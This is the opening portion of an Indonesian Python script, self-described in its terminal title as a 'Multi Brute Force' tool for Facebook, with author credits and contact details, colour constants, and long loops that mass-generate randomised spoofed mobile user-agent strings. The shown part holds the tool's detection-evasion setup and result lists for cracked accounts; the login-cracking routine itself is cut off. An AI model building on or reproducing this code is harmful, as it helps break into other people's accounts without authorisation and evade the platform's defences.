###------[  Denventa Afriliyan Ferly   ]------###
# ------  [ Gausah Dioprek Ntar Error ] ------ #
Facebook = 'Facebook.com/Denventa.Xayonara.Team.UnlimitedARMY'
Develpr = 'Denventa Ferly Afriliyan' 
Version = '0.7' 
Dnventa = 100013275378835 
Post_Dev = 1658880191231144 
###----------[ AUTHOR & CREATOR ]---------- ###
# ------ [ Gausah Dioprek Ntar Error ] ------ #
Author    = 'Dapunta Khurayra X'
Facebook  = 'Facebook.com/Dapunta.Khurayra.X'
Instagram = 'Instagram.com/Dapunta.Ratya'
Whatsapp  = '082245780524'
YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
Denventa  = 1827084332
###----------[ IMPORT LIBRARY ]---------- ###
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from rich import print as printer
from rich.panel import Panel
from urllib.parse import quote


###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

###----------[ USER AGENT ]---------- ###
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36'
ua_nokia   = 'Mozilla/5.0 (Linux; Android 5.1; iris605 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/286.0.0.5.105;]'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 5.1; vivo Y21 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A536 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.73 Mobile Safari/537.36'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
ua_chrome  = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/112.0.0.0 Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
ua_redmi   = 'Mozilla/5.0 (Linux; Android 10; Redmi 8A Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]'
ua_sony    = 'Mozilla/5.0 (Linux; Android 11; J9110 Build/55.2.A.4.332; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.22 Mobile Safari/537.36 open_news open_news_u_s/4509'
ua_random = random.choice([ua_default,ua_samsung,ua_nokia,ua_xiaomi,ua_oppo,ua_vivo,ua_iphone,ua_asus,ua_lenovo,ua_huawei,ua_windows,ua_chrome,ua_fb,ua_redmi,ua_sony])
komentar   = '\n\nhttps://www.facebook.com/' + str(Post_Dev)

###----------[ TIME ]---------- ###
id_dev = 345 - 340 + 720 - 723
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
Codename  = 159357
CoY = ('\r   %s[%s•%s] %sDilarang Keras Merecode %s!%s'%(M,P,M,P,M,P))
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))

###----------[ APPEND ]---------- ###
OK = []
CP = []
gabung_sandi = []
tempel_sandi = []
ugen2 = []
ugent = []
uaku2 = []
usam = []
ugen = []
uakuh = []
usragent = []
sys.stdout.write('\x1b]2; DMBF - Facebook | Denventa Multi Brute Force - Facebook\x07')
###----------[ GENERATE USERAGENT ]---------- ###
for xd in range(10000) :
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e='Mobile Safari/537.36'
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e='Mobile Safari/537.36'
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G (5) Plus Build/NPNS25.137-35-5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G (5S) Plus Build/NPS26.116-51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='moto e5 Build/OPPS27.91-176-11-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(6, 14) 
	c='SM-A105'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=str(random.randrange(10, 214))+'.0.'+str(random.randrange(3000, 7000))+'.'+str(random.randrange(10, 275)) 
	f=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	geko=f'{a} {b}; {c}) {d}{e} {f}'
	ugen2.append(geko) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G Play Build/NPIS26.48-43-2) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='RMX'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='CPH'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='vivo'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga)
	
for agenku in range(10000):
	a='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X653C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)80.0.4758.60 Version/4.0 Linux/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3 '
	uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='Nokia_X'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/300.2.0.58.129;]'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)

	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ASUS_Z01QD'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0. 0.29.105;]'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=(['S88Plus'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]'
	uakuh=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	usragent.append(uakuh)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-J610F'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(80,106)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-A51 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12 .108;]'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SGP712'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 [FB_IAB/FB4A;FBAV/351.0 .0.38.117;]'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['S98Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
